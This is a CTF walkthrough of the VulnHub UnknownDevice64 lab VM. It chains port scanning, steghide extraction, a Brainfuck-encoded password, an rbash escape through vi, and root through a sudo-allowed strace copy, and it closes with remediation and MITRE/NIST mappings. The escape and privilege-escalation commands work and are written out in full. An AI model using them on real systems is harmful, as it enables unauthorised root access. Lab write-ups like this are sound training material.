# VulnHub UnknownDevice64: 1 — Hidden in Plain Sight, Wrapped in Brainfuck

Alright guys!! Who would have thought that cracking a CTF would require decoding a programming language literally named "brainfuck"? That is the kind of challenge that makes you go from "I got this" to "wait, what am I even looking at" in about thirty seconds flat. This one is legit a ride.

Huge props to **Ajay Verma** for crafting a VM that layers steganography, esoteric language decoding and a restricted shell bypass into what looks like a beginner challenge on the surface. Noice work, fr fr.

---

| Field | Value |
|-------|-------|
| **Level** | Beginner to Intermediate |
| **Target VM** | UnknownDevice64: 1 |
| **Attacker VM** | Kali Linux 2019.1 |
| **VulnHub** | https://www.vulnhub.com/entry/unknowndevice64-1,435/ |
| **Techniques** | Host discovery, Nmap enumeration, web source analysis, steganography (steghide), Brainfuck decode, SSH access, rbash bypass (vi), PATH fix, sudo privesc (sysud64/strace) |
| **CVEs** | N/A (misconfiguration and logic chain) |

---

## Attack Summary

```
[host-discovery: nmap -sn]
    |
    v
[nmap -A -T4 -p-: SSH/1337, HTTP/31337]
    |
    v
[web browser: hidden HTML comment -> key_is_h1dd3n.jpg]
    |
    v
[steghide extract: passphrase h1dd3n -> h1dd3n.txt (Brainfuck)]
    |
    v
[Brainfuck decode -> credentials ud64:1M!#64@ud]
    |
    v
[SSH login: ssh ud64@TARGET -p 1337 -> rbash]
    |
    v
[rbash bypass via vi -> :!/bin/bash -> fix PATH]
    |
    v
[sudo -l -> sysud64 (alias for strace)]
    |
    v
[sudo sysud64 -o /dev/null /bin/sh -> ROOT]
    |
    v
[cat /root/flag.txt]
```

---

## Methodology

1. Host discovery to identify the target IP on the local network
2. Port and service enumeration with Nmap (all 65535 ports)
3. Web application analysis: browsing and reading page source
4. Hidden image extraction via steganography (steghide)
5. Esoteric language decoding (Brainfuck) to recover SSH credentials
6. SSH login through non-standard port 1337
7. Restricted shell (rbash) bypass using vi and PATH repair
8. Privilege escalation via misconfigured sudo on a custom binary

---

## Step 1 — Identifying the Target

Before touching anything, we need to know where our target lives on the network. `route -n` gives us the gateway and subnet mask, which we feed directly into Nmap.

```bash
route -n
# Look for the Iface column and the Gateway: that tells you the subnet
```

With the subnet in hand, scan for live hosts:

```bash
# Option 1: nmap ping scan (widely compatible)
nmap -sn -T5 192.168.10.0/24

# Option 2: arp-scan (faster on local networks, fewer false negatives)
arp-scan --localnet --ignoredups
```

Note down the IP that shows up and is not your Kali box or your router. That is your target. Let us call it `TARGET_IP` from here on.

> **MITRE ATT&CK:** T1595.001 Active Scanning: Scanning IP Blocks

---

## Step 2 — Reconnaissance and Service Enumeration

Time to see what is running. We scan every single port because non-standard ports are a classic CTF move, and this VM is already using 1337 and 31337. Never scan only the top 1000.

```bash
nmap -A -T4 -p- TARGET_IP
# -A: enables OS detection, version detection, script scanning, traceroute
# -T4: aggressive timing (safe in a local lab)
# -p-: scans all 65535 TCP ports
```

Expected output:

```
1337/tcp  open  ssh   OpenSSH 7.7 (protocol 2.0)
31337/tcp open  http  SimpleHTTPServer 0.6 (Python 2.7.14)
```

Two findings, both on "leet" ports. That is not a coincidence: 1337 is "leet speak" for "leet" and 31337 doubles down on the same joke. The author is already leaving breadcrumbs. Port 1337 is SSH and port 31337 is a Python SimpleHTTPServer. We investigate the web service first.

> **MITRE ATT&CK:** T1595.002 Active Scanning: Vulnerability Scanning, T1046 Network Service Discovery

---

## Step 3 — Web Application Analysis and Hidden Comment Discovery

> **What is this HTTP service?**
> Python's `SimpleHTTPServer` (or `http.server` in Python 3) serves the contents of a directory over HTTP. It has no authentication, no dynamic functionality by default, just static files. But even static files can hide secrets.

Open your browser and visit:

```
http://TARGET_IP:31337/
```

You will land on a page with some cryptic text referencing "ud64" and the path `./AjayVerma`, styled similarly to a script execution. The word "h1dd3n" appears, which is leet-speak for "hidden". Nothing screams "there is a file here" louder than a CTF page that keeps saying "hidden".

Now view the page source. Right-click and "View Page Source", or use curl:

```bash
curl -s http://TARGET_IP:31337/ | grep -i "<!--"
# Look for HTML comments that tools like gobuster won't surface
```

Expected output inside the source:

```html
<!-- key_is_h1dd3n.jpg -->
```

Bingo! ( ͡° ͜ʖ ͡°) That is a file name hiding in an HTML comment. Gobuster and Dirb returned only `index.html` here because this image was not linked anywhere in the HTML body, just buried in a comment. Classic CTF trap.

Fetch the image:

```bash
wget http://TARGET_IP:31337/key_is_h1dd3n.jpg
```

> **Real-world note:** Sensitive information buried in HTML comments is far more common in production apps than people admit. Developers leave API keys, internal hostnames, and version strings in comments during debugging and forget to remove them. The 2019 Capital One breach investigation surfaced similar patterns where metadata exposure in server responses aided attackers. Reference: https://owasp.org/www-project-web-security-testing-guide/

> **MITRE ATT&CK:** T1083 File and Directory Discovery, T1593 Search Open Websites/Domains

---

## Step 4 — Steganography: Extracting the Hidden Payload

> **What is steganography?**
> Steganography is the practice of hiding a message or file inside another file. Unlike encryption, which makes content unreadable, steganography makes the content invisible: the carrier file (like a JPEG image) looks completely normal to anyone browsing it. The hidden data can be tucked into the least-significant bits of pixel values, appended after the end-of-file marker, or stored in other ways. In CTFs, JPEG steganography with password protection via `steghide` is a recurring technique.
> Reference: https://en.wikipedia.org/wiki/Steganography

We have an image, we have a theme built around the number 1337 and the word "h1dd3n". The passphrase is almost certainly one of those. Try `h1dd3n` first:

```bash
steghide extract -sf key_is_h1dd3n.jpg -p "h1dd3n"
```

If you do not have `steghide`:

```bash
apt install steghide -y
```

Expected output:

```
wrote extracted data to "h1dd3n.txt".
```

If that passphrase had failed, you could brute-force it with a wordlist using a simple loop, no extra tool needed:

```bash
for i in $(cat /usr/share/wordlists/rockyou.txt); do
  steghide extract -sf key_is_h1dd3n.jpg -f -p "$i" 2>/dev/null \
    && echo "[*] Found passphrase: $i" && break
done
```

Check what was extracted:

```bash
cat h1dd3n.txt
```

Expected content:

```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++++++++++++++.-----------------.<----------------.--.++++++.---------.>-----------------------.<<+++.++.>+++++.--.++++++++++++.>++++++++++++++++++++++++++++++++++++++++.------------------.
```

That right there is **Brainfuck**, an esoteric programming language where the entire instruction set consists of eight characters: `+`, `-`, `>`, `<`, `[`, `]`, `.`, and `,`. It is Turing-complete and completely unreadable to humans without a decoder. ¯\_(ツ)_/¯

> **MITRE ATT&CK:** T1027 Obfuscated Files or Information

---

## Step 5 — Decoding Brainfuck to Recover Credentials

Use an online decoder or a local interpreter. The tool at https://www.dcode.fr/brainfuck-language works well.

Paste the content of `h1dd3n.txt` and run the interpreter.

Output:

```
ud64:1M!#64@ud
```

Dissect that:

```
Username: ud64
Password: 1M!#64@ud
```

ᕕ( ᐛ )ᕗ Credentials decoded! Now we know where to use them: that SSH service on port 1337.

> **MITRE ATT&CK:** T1078 Valid Accounts, T1552.001 Unsecured Credentials: Credentials in Files

---

## Step 6 — SSH Login and Discovering the Restricted Shell

Time to connect. Remember the non-standard port:

```bash
ssh ud64@TARGET_IP -p 1337
# Enter password when prompted: 1M!#64@ud
```

We are in. But something feels off immediately. Try basic navigation:

```bash
ls
cd /
cat /etc/passwd
```

Several commands return "command not found" or "restricted". Check what shell you are in and what the PATH looks like:

```bash
echo $SHELL
echo $PATH
```

You are in `rbash`, the Restricted Bash shell. The PATH is limited to something like `/home/ud64/prog`, which has almost nothing useful in it. Changing directories upward is blocked, pipe behavior is limited, and many commands are simply invisible because their directories are not in PATH.

> **MITRE ATT&CK:** T1059.004 Command and Scripting Interpreter: Unix Shell

---

## Step 7 — Restricted Shell Bypass via vi

> **What is rbash?**
> Restricted Bash (`rbash`) is a mode of Bash that prevents users from changing directories with `cd`, modifying `PATH` or `SHELL`, redirecting output to files with `>`, and executing commands that contain `/`. It is meant to limit what a limited-privilege account can do. However, rbash can often be bypassed if any interactive program that allows executing shell commands is available.

Several bypass attempts fail here, so let us save you the rabbit holes:

```bash
bash          # blocked: contains a path separator logic
python -c "import pty; pty.spawn('/bin/bash')"  # python not in PATH
sh            # same issue
```

But `vi` is available! And vi has a built-in shell escape. Open it and then escape to a full shell:

```bash
vi
```

Inside vi, type (in normal mode, not insert mode):

```vim
:!/bin/bash
```

**Wow guys!! Bypass Restricted Shell Done!! :D**

You now have a bash shell, but PATH is still broken. Fix it:

```bash
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Now `ls`, `cat`, `find`, `id` all work. Verify who you are:

```bash
id
# uid=1000(ud64) gid=1000(ud64) groups=1000(ud64)
```

Still `ud64`, not root. We need to escalate.

> **GTFOBins reference:** https://gtfobins.github.io/gtfobins/vi/
> **MITRE ATT&CK:** T1548.003 Abuse Elevation Control Mechanism: Sudo, T1059.004 Unix Shell

---

## Step 8 — Privilege Escalation via Sudo and Custom Binary

First, check sudo permissions:

```bash
sudo -l
```

Expected output (something like):

```
User ud64 may run the following commands on unknowndevice64:
    (root) NOPASSWD: /usr/local/bin/sysud64
```

`sysud64` is unfamiliar. Check its help text:

```bash
sysud64 -h | more
```

The header of the help output reveals it is a copy (or alias) of `strace`, the Linux syscall tracer. This means we can run strace as root via sudo, and strace can execute arbitrary programs.

```bash
sudo sysud64 -o /dev/null /bin/sh
```

- `-o /dev/null`: discards the strace output (we do not need the syscall trace)
- `/bin/sh`: the command to trace and execute with root privileges

> **GTFOBins reference:** https://gtfobins.github.io/gtfobins/strace/

Verify:

```bash
whoami
# root
id
# uid=0(root) gid=0(root) groups=0(root)
```

(☞ﾟヮﾟ)☞ ROOT!

> **MITRE ATT&CK:** TA0004 Privilege Escalation, T1548.003 Sudo and Sudo Caching

---

## Step 9 — Read the Flag

```bash
cat /root/flag.txt
```

The flag lives there, along with the author's congratulatory message. You earned it.

> **MITRE ATT&CK:** T1005 Data from Local System

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|------|-------|----------|-------------|
| Credential | `ud64:1M!#64@ud` | `h1dd3n.txt` (Brainfuck decoded) | SSH login port 1337 |
| Steghide passphrase | `h1dd3n` | Inferred from leet-speak theme | steghide extract |
| Flag | see /root/flag.txt | `/root/flag.txt` | N/A |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---------|---------------------|-------------|
| 1 | Credentials hidden in steganographic image behind leet-speak clues | Insiders and attackers embed credentials in image metadata and binary blobs in real environments | Always analyze binary files in suspicious directories, not just readable text |
| 2 | rbash restricted shell is bypassable via vi | Many hardened servers allow text editors but forget editors have shell escapes | Disable or restrict all interactive programs that call shell; use GTFOBins as a checklist |
| 3 | Custom binary alias (`sysud64`) pointing to `strace` in sudoers | Custom wrappers in sudoers are common in enterprise scripts; auditors often miss them | Audit sudoers regularly; never grant NOPASSWD to binaries that allow arbitrary execution |

**Why does this matter outside the lab?**

The 2020 SolarWinds supply chain attack demonstrated how attackers hide payloads in unexpected places: binary resources, update packages, image files. The technique of embedding credentials or C2 beacons in images is used by real threat actors including APT28 (Fancy Bear) and APT10 (Stone Panda), both of which have used steganography in spear-phishing campaigns. The sudo misconfiguration pattern maps directly to misconfigurations found in enterprise Linux audits: organizations deploy custom wrapper scripts for monitoring tools and grant them NOPASSWD sudo rights, creating trivial privilege escalation paths that persist for years.

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP-ID |
|-------|--------|-----------|--------|
| Reconnaissance | TA0043 | Active Scanning: Scanning IP Blocks | T1595.001 |
| Reconnaissance | TA0043 | Active Scanning: Vulnerability Scanning | T1595.002 |
| Discovery | TA0007 | Network Service Discovery | T1046 |
| Discovery | TA0007 | File and Directory Discovery | T1083 |
| Collection | TA0009 | Data from Local System | T1005 |
| Defense Evasion | TA0005 | Obfuscated Files or Information | T1027 |
| Credential Access | TA0006 | Unsecured Credentials: Credentials in Files | T1552.001 |
| Initial Access | TA0001 | Valid Accounts | T1078 |
| Lateral Movement | TA0008 | Remote Services: SSH | T1021.004 |
| Execution | TA0002 | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Privilege Escalation | TA0004 | Abuse Elevation Control Mechanism: Sudo | T1548.003 |
| Privilege Escalation | TA0004 | Setuid and Setgid | T1548.001 |

> MITRE ATT&CK: https://attack.mitre.org/
> MITRE D3FEND: https://d3fend.mitre.org/

---

## Threat Actor Context

The techniques chained in this VM overlap with TTPs documented for several APT groups:

**APT28 (Fancy Bear / Sofacy):** Known for embedding payloads and decoy content inside image files using steganography, particularly in spear-phishing campaigns targeting government and defense sectors. Reference: MITRE ATT&CK Group G0007.

**APT10 (Stone Panda / menuPass):** Documented use of obfuscated payloads and lure documents that embed credentials in non-obvious locations, targeting managed service providers. Reference: MITRE ATT&CK Group G0045.

**FIN7:** Uses custom binary wrappers and renamed legitimate tools (similar to `sysud64` aliasing `strace`) to evade detection during post-exploitation. Reference: MITRE ATT&CK Group G0046.

---

## Remediation and Containment

### Technical Fixes

1. Remove credentials and sensitive data from any file served over HTTP, including images: run `exiftool` and `steghide` checks on all publicly accessible media files
2. Replace rbash with proper application accounts having no interactive shell (`/usr/sbin/nologin`) or use SSH `ForceCommand` to restrict operations
3. Audit `/etc/sudoers` and remove NOPASSWD entries for any binary that allows shell execution; validate using GTFOBins before approving any sudo rule
4. Rename or remove custom binary aliases that obscure what is actually being executed; document all wrapper scripts in your asset inventory
5. Move SSH to a non-standard port only as defense-in-depth, never as the sole control: pair it with key-based auth and disable password login in `sshd_config`

### If You Find Something Similar in Your Environment

**Immediate containment:**
- Rotate all credentials extracted from the compromised service immediately
- Audit sudoers on all Linux hosts for NOPASSWD entries pointing to execution-capable binaries
- Search for steganographic payloads in image repositories: `steghide info <file>` flags files with hidden data
- Review all web-served directories for sensitive files and HTML comments containing internal references

**MITRE D3FEND countermeasures:**
- D3-MFA (Multi-factor Authentication) against T1078 Valid Accounts: require MFA for all SSH access
- D3-IVA (Input Validation and Filtering) against T1190: validate and sanitize all HTTP-served files
- D3-OPS (OS Process Sandboxing) against T1548: restrict process execution via Linux namespaces or seccomp
- D3-SJA (Scheduled Job Analysis) against persistence via cron if established after privesc
- D3-CTS (Credential Transmission Scoping) against T1552.001: audit file permissions and scan repos for credentials

### Framework Alignment

**NIST CSF 2.0:**
- Identify (ID.AM): Maintain an accurate inventory of all user accounts, especially service accounts, and document their shell and sudo rights
- Protect (PR.AC-4): Implement least-privilege access; review all NOPASSWD sudo entries quarterly
- Protect (PR.DS-5): Protect against data leaks by scanning media files for embedded content before serving them publicly
- Detect (DE.AE-2): Alert on SSH logins from unexpected source IPs and failed logins followed by success
- Respond (RS.AN-1): Document credential rotation procedures; activate them within 1 hour of a confirmed breach

**NIST SP 800-53 (Rev. 5) Controls:**
- AC-6: Least Privilege: no user should have NOPASSWD sudo on execution-capable tools
- IA-5: Authenticator Management: disable SSH password authentication; enforce key-based auth
- CM-7: Least Functionality: disable or remove interactive editors from restricted accounts
- SI-3: Malware Protection: scan uploaded and served files for hidden payloads
- AU-2: Event Logging: log all sudo executions; forward to a centralized SIEM

**CISA Known Exploited Vulnerabilities:**
- No direct CVE mapping for this VM's techniques (misconfiguration chain, not a known CVE)
- Monitor: https://www.cisa.gov/known-exploited-vulnerabilities-catalog for OpenSSH and Python HTTPServer vulnerabilities

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domain: ACCESS, Practice: Identity Management, Target MIL-2: Enforce least privilege, review privileged accounts regularly
- Domain: TECHNOLOGY, Practice: Configuration Management, Target MIL-2: Audit sudoers and shell configurations against a hardened baseline
- Domain: SITUATIONAL AWARENESS, Practice: Logging and Monitoring, Target MIL-2: Monitor for rbash bypass indicators (vi/python executions under restricted accounts)

---

## Final Thoughts

Thanks to **Ajay Verma** for building a VM that takes what looks like a simple beginner challenge and packs it full of layered thinking: you have to read between the lines (literally, in the HTML source), recognize an encoding format you may never have seen before, and chain a restricted shell escape with a creative sudo abuse.

This VM is a gentle reminder that "beginner" in CTF terms does not mean "trivial." The real lesson here is lateral thinking: the password was hidden in an image, the image URL was hidden in a comment, the credentials were encoded in Brainfuck, and the escalation path hid behind a custom binary name. Each layer required stepping back and asking "what does this thing actually do?" rather than running the same tools on repeat.

These same patterns appear in real penetration tests constantly. Developers hide things in source comments. Operations teams rename binaries to obscure their purpose. Admins grant sudo rights to "harmless" monitoring tools without checking GTFOBins first. Practicing on VMs like this one builds the instinct to look underneath the obvious.

If this walkthrough helped you, share it with your crew and keep hacking!

*Thanks guys!! (❍ᴥ❍ʋ)*

> Original article in Portuguese by André Henrique: https://medium.com/uniaogeek/vulnhub-unknown-device-vm-1-a0b05a8f12c2

---

*Writeup by [André Henrique](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
